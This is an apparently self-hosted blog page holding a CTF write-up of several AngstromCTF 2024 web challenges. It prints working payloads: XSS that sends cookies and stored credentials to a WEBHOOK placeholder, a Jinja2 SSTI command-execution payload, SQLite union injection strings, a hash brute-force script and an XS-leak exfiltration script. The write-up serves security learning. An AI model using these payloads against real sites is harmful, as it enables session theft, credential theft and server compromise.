@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>AngstromCTF2024 | My New Hugo Site</title>
+<meta name="keywords" content="">
+<meta name="description" content="TL;DR
+This is a writeup for some web challenge for AngstromCTF 2024
+Spinner
+const message = async () =&gt; {
+    if (state.flagged) return
+    const element = document.querySelector(&#39;.message&#39;)
+    element.textContent = Math.floor(state.total / 360)
+    if (state.total &gt;= 10_000 * 360) {
+        state.flagged = true
+        const response = await fetch(&#39;/falg&#39;, { method: &#39;POST&#39; })
+        element.textContent = await response.text()
+    }
+}
+message()
+We can simply make POST request to /falg or using the console to assign the state.total to any number larger than stated above.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/writeups/angstromctf2024/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.9de45e225101e4f99701d2b68fc6b8a1ef6027928be6391fa15bf7f56326c909.css" integrity="sha256-neReIlEB5PmXAdK2j8a4oe9gJ5KL5jkfoVv39WMmyQk=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/angstromctf2024/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="My New Hugo Site (Alt + H)">My New Hugo Site</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      AngstromCTF2024
+    </h1>
+    <div class="post-meta"><span title='2025-02-05 15:18:06 +0700 +07'>February 5, 2025</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="tldr">TL;DR<a hidden class="anchor" aria-hidden="true" href="#tldr">#</a></h2>
+<p>This is a writeup for some web challenge for AngstromCTF 2024</p>
+<h2 id="spinner">Spinner<a hidden class="anchor" aria-hidden="true" href="#spinner">#</a></h2>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">const message = async () =&gt; {
+    if (state.flagged) return
+    const element = document.querySelector(&#39;.message&#39;)
+    element.textContent = Math.floor(state.total / 360)
+    if (state.total &gt;= 10_000 * 360) {
+        state.flagged = true
+        const response = await fetch(&#39;/falg&#39;, { method: &#39;POST&#39; })
+        element.textContent = await response.text()
+    }
+}
+message()
+</code></pre><p>We can simply make POST request to /falg or using the console to assign the state.total to any number larger than stated above.</p>
+<h2 id="markdown">Markdown<a hidden class="anchor" aria-hidden="true" href="#markdown">#</a></h2>
+<p>There are no filtering or any encoding use while parsing the HTML, so this is a simple XSS.</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">app.get(&#39;/view/:id&#39;, (_req, res) =&gt; {
+    const marked = (
+        &#39;https://cdnjs.cloudflare.com/ajax/libs/marked/4.2.2/marked.min.js&#39;
+    )
+
+    res.type(&#39;text/html&#39;).end(`
+        &lt;link rel=&#34;stylesheet&#34; href=&#34;/style.css&#34;&gt;
+        &lt;div class=&#34;content&#34;&gt;
+        &lt;/div&gt;
+        &lt;script src=&#34;${marked}&#34;&gt;&lt;/script&gt;
+        &lt;script&gt;
+            const content = document.querySelector(&#39;.content&#39;)
+            const id = document.location.pathname.split(&#39;/&#39;).pop()
+
+            delete (async () =&gt; {
+                const response = await fetch(\`/content/\${id}\`)
+                const text = await response.text()
+                content.innerHTML = marked.parse(text)
+            })()
+        &lt;/script&gt;
+    `)
+})
+</code></pre><p>A simple img tag can help us retrieve the cookie.</p>
+<pre tabindex="0"><code class="language-htmlembedded=" data-lang="htmlembedded=">&lt;img src=&#34;&#34; onerror=&#34;location=&#39;WEBHOOK/?c=&#39;+document.cookie&#34;&gt;
+</code></pre><p>And finally make a GET request to get the flag.</p>
+<h2 id="winds">Winds<a hidden class="anchor" aria-hidden="true" href="#winds">#</a></h2>
+<p>This is an Jinja2 SSTI challenge, which they used render_template_string with untrusted data.</p>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">@app.post(&#39;/shout&#39;)
+def shout():
+    text = request.form.get(&#39;text&#39;, &#39;&#39;)
+    if not text:
+        return redirect(&#39;/?error=No message provided...&#39;)
+
+    random.seed(0)
+    jumbled = list(text)
+    random.shuffle(jumbled)
+    jumbled = &#39;&#39;.join(jumbled)
+
+    return render_template_string(&#39;&#39;&#39;
+        &lt;link rel=&#34;stylesheet&#34; href=&#34;/style.css&#34;&gt;
+        &lt;div class=&#34;content&#34;&gt;
+            &lt;h1&gt;The windy hills&lt;/h1&gt;
+            &lt;form action=&#34;/shout&#34; method=&#34;POST&#34;&gt;
+                &lt;input type=&#34;text&#34; name=&#34;text&#34; placeholder=&#34;Hello!&#34;&gt;
+                &lt;input type=&#34;submit&#34; value=&#34;Shout your message...&#34;&gt;
+            &lt;/form&gt;
+            &lt;div style=&#34;color: red;&#34;&gt;{{ error }}&lt;/div&gt;
+            &lt;div&gt;
+                Your voice echoes back: %s
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &#39;&#39;&#39; % jumbled, error=request.args.get(&#39;error&#39;, &#39;&#39;))
+</code></pre><p>The tricky part was that the text was shuffle, but with the seed 0, we could preshuffle the payload so that it worked.</p>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">import random
+
+def unshuffle(text):
+    random.seed(0)
+    a = list(range(len(text)))
+    random.shuffle(a)
+    new_text = &#39;X&#39;*len(text)
+    for i in range(len(text)):
+        new_text = text[i] + new_text[a[i]+1:]
+    jumbled = &#39;&#39;.join(text[a.index(i)] for i in range(len(text)))
+    return jumbled
+
+payload = &#34;{{ cycler.__init__.__globals__.os.popen(&#39;cat flag.txt&#39;).read() }}&#34;
+
+def shuffler(payload):
+    random.seed(0)
+    jumbled = list(payload)
+    random.shuffle(jumbled)
+    jumbled = &#39;&#39;.join(jumbled)
+    return jumbled
+
+a  = unshuffle(payload)
+print(a)
+</code></pre><h2 id="store">Store<a hidden class="anchor" aria-hidden="true" href="#store">#</a></h2>
+<p>Firstly, I doubted this is an SQLi challenge. Making POST request with <code>item=a' or 1;-- -</code>.
+I was able to identify the database which is SQLite thanks to this <code>item=a' or sqlite_version()=sqlite_version();-- -</code>.
+will return everything. By trying union select, I knew the number of column of the table and the context of each column. <code>item=a' union select 'a','b','c';-- -</code>.
+So following cheatsheet helped me find all the tables name <code>item=a' union select 'a','a',(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%');-- -</code>.
+We got a table whose name flags&hellip; Bingo !!!
+Enumerated the columns <code>item=a' union select 'a','a',(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flags...');-- -</code>
+And finally retrieved the flag.</p>
+<h2 id="pastebin">Pastebin<a hidden class="anchor" aria-hidden="true" href="#pastebin">#</a></h2>
+<h3 id="first-finding">First finding<a hidden class="anchor" aria-hidden="true" href="#first-finding">#</a></h3>
+<p>This challenge is quite interesting.
+At first, I didn&rsquo;t know that secrets is a built-in library of python. I though it is something like secrets.py or so. And secrets.token_hex is a function.
+Running str(secrets.token_hex) will get us <code>&lt;function token_hex at 0x7fb85f4c2520&gt;</code>. Ahhhh, address.
+The /view endpoint with id=0 will get us the flag, if we got the MD5 password or the first 3 bytes of the MD5 password.</p>
+<h3 id="idsomething">id(something)<a hidden class="anchor" aria-hidden="true" href="#idsomething">#</a></h3>
+<p>This function will get the address of the thing we put in.</p>
+<h3 id="solve">Solve<a hidden class="anchor" aria-hidden="true" href="#solve">#</a></h3>
+<p>Why not bruteforcing the address. I thought that the address of the secrets.token_hex can be bruteforce. Combining with the hash 3 bytes, we could get the real password.</p>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">import hashlib
+from tqdm import tqdm
+
+base = 135598372746984
+ADMIN_PASSWORD_head = &#39;1797c2&#39;
+print(&#34;Brute up&#34;)
+for i in tqdm(range(100_000_000)):
+    h = hashlib.md5(f&#39;password-&lt;function token_hex at {hex(base+i)}&gt;&#39;.encode()).hexdigest()
+    if h[:6] == ADMIN_PASSWORD_head:
+        print(f&#39;Found: {hex(base+i)}&#39;)
+        print(f&#34;h: {h}&#34;)
+print(&#34;Brute down&#34;)
+for i in tqdm(range(100_000_000)):
+    h = hashlib.md5(f&#39;password-&lt;function token_hex at {hex(base-i)}&gt;&#39;.encode()).hexdigest()
+    if h[:6] == ADMIN_PASSWORD_head:
+        print(f&#39;Found: {hex(base-i)}&#39;)
+        print(f&#34;h: {h}&#34;)
+</code></pre><p>There were a few collision, but anyways, after 10 minutes and some try and error, you will get the flag.</p>
+<h2 id="tickler">Tickler<a hidden class="anchor" aria-hidden="true" href="#tickler">#</a></h2>
+<p>This is annother client-side challenge with CSP.</p>
+<h3 id="csp">CSP<a hidden class="anchor" aria-hidden="true" href="#csp">#</a></h3>
+<p>The CSP was set to <code>script-src 'self'</code>. What is self?
+<code>'self'</code> : Refers to the origin from which the protected document is being served, including the same URL scheme and port number.</p>
+<h3 id="html-injection">HTML Injection<a hidden class="anchor" aria-hidden="true" href="#html-injection">#</a></h3>
+<p>In client.js, we saw this:</p>
+<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">&#34;/login&#34;: async () =&gt; {
+    const form = document.querySelector(&#34;form&#34;);
+    const error = document.querySelector(&#34;p&#34;);
+    const query = new URLSearchParams(window.location.search);
+    if (query.has(&#34;error&#34;)) {
+        error.innerHTML = query.get(&#34;error&#34;) ?? &#34;&#34;;
+    }
+    form.addEventListener(&#34;submit&#34;, async (event) =&gt; {
+        event.preventDefault();
+        const username = form.elements.namedItem(&#34;n&#34;);
+        const password = form.elements.namedItem(&#34;p&#34;);
+        const result = await client.doLogin.mutate({
+          username: username.value,
+          password: password.value
+        });
+        if (!result.success) {
+          error.textContent = `Login failed. ${result.message}`;
+        } else {
+          localStorage.setItem(&#34;username&#34;, username.value);
+          localStorage.setItem(&#34;password&#34;, password.value);
+          window.location.href = &#34;/&#34;;
+        }
+    });
+},
+</code></pre><p>So, by <code>/login?error=&lt;h1&gt;hehe&lt;/h1&gt;</code>, we got our HTML Injection.</p>
+<h3 id="simple-xss-right">Simple XSS (right?)<a hidden class="anchor" aria-hidden="true" href="#simple-xss-right">#</a></h3>
+<p>Will a simple</p>
+<pre tabindex="0"><code class="language-htmlembedded=" data-lang="htmlembedded=">&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><p>worked?
+NO. It would be blocked by CSP. Maybe we need to upload something so that we could refer to it and not trigger CSP.
+In server.ts, it has an endpoint which is /api/setPicture. and this is helpful. But it read data and base64 encode them, how can deal with this?</p>
+<pre tabindex="0"><code class="language-typescript=" data-lang="typescript=">const buffer = new Blob(data)
+const array = await buffer.arrayBuffer()
+const base64 = Buffer.from(array).toString(&#39;base64&#39;)
+pictures.set(ctx.user, {
+    data: base64,
+    type: response.headers.get(&#39;content-type&#39;) ?? &#39;image/png&#39;,
+})
+return { success: true as const }
+</code></pre><pre tabindex="0"><code class="language-typescript=" data-lang="typescript=">else if (route === &#39;/picture&#39;) {
+    if (!url.includes(&#39;?&#39;)) return end()
+
+    const query = new URLSearchParams(url.slice(url.indexOf(&#39;?&#39;)))
+    const username = query.get(&#39;username&#39;)
+
+    if (username === null) return end()
+
+    const picture = pictures.get(username)
+    if (picture === undefined) return end()
+
+    const { data, type } = picture
+    res.end(`data:${type};base64,${data}`)
+}
+</code></pre><p>We could modify the Content-Type.
+But can javascript execute anything with <code>data:</code> in front of it? The answer is yes, actually, it can execute anything <code>anything:</code> before colon, because javascript treat those as labels. <!-- raw HTML omitted -->labeled statement<!-- raw HTML omitted -->
+So, simply host a Flask server</p>
+<pre tabindex="0"><code class="language-python=" data-lang="python=">from flask import Flask, make_response
+
+app = Flask(__name__, static_folder=&#39;static&#39;)
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def print_headers():
+    response = make_response(&#34;hehe&#34;)
+    response.headers[&#39;Content-Type&#39;] = &#39;document.location=`WEBHOOK/?c=${localStorage.getItem(&#34;username&#34;)}_${localStorage.getItem(&#34;password&#34;)}`//&#39;
+    return response
+
+if __name__ == &#34;__main__&#34;:
+    app.run(port=5000, host=&#34;0.0.0.0&#34;)
+</code></pre><h3 id="execute">Execute<a hidden class="anchor" aria-hidden="true" href="#execute">#</a></h3>
+<p>We could simply add</p>
+<pre tabindex="0"><code class="language-htmlembedded!" data-lang="htmlembedded!">&lt;script src=&#34;/picture?username=testtesttest&#34;&gt;&lt;/script&gt;
+</code></pre><p>to the login page right? No, because our script tag was added after the client.js load. How to deal with this? Iframe. We can have an iframe that run our javascript.
+That&rsquo;s how we got this URL.</p>
+<pre tabindex="0"><code>https://tickler.web.actf.co/login?error=%3Ciframe%20srcdoc=%27%3Cscript%20src=%22/picture?username=testtesttest%22%3E%3C/script%3E%27%3E
+</code></pre><p>The rest leaves to you then.</p>
+<h2 id="wonderful-wicked-wrathful-wiretapping-wholesale-world-wide-watermark-as-a-service">Wonderful Wicked Wrathful Wiretapping Wholesale World Wide Watermark as a Service<a hidden class="anchor" aria-hidden="true" href="#wonderful-wicked-wrathful-wiretapping-wholesale-world-wide-watermark-as-a-service">#</a></h2>
+<p>This challenege was not pretty hard, because we could use img or script tag to check whether a site is 404 or 200. To be honest, this won&rsquo;t work for latest version of Chrome, because of Chrome&rsquo;s ORB. But luckily, the browser of admin bot was outdated. And another factor was that they configured the challenge&rsquo;s sites with SameSite policy, that&rsquo;s why the unintended trick worked.
+The exploit script</p>
+<pre tabindex="0"><code class="language-javascript!" data-lang="javascript!">let flag = &#34;actf{&#34;;
+
+let index = 0;
+function search() {
+    let charset = &#34;0123456789abcdefghijklmnopqrstuvwxyz_}&#34;;
+    let c = charset[index];
+    let s = document.createElement(&#34;script&#34;);
+    s.src = &#34;https://wwwwwwwwaas.web.actf.co/search?q=&#34; + encodeURIComponent(flag + c);
+    s.onload = () =&gt; {
+        flag += c;
+        index = 0;
+        new Image().src=(&#34;WEBHOOK/?flag=&#34; + encodeURIComponent(flag));
+        search();
+    }
+    s.onerror  = () =&gt; {
+        index++;
+        search();
+    }
+    document.head.appendChild(s);
+}
+search();
+</code></pre><p>And in the Markdown challenge, we simply used</p>
+<pre tabindex="0"><code class="language-htmlembedded!" data-lang="htmlembedded!">&lt;iframe srcdoc=&#34;&lt;script src=&#39;HOST/exploit.js&#39;&gt;&lt;/script&gt;&#34;/&gt;
+</code></pre><p>That&rsquo;s it.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">My New Hugo Site</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
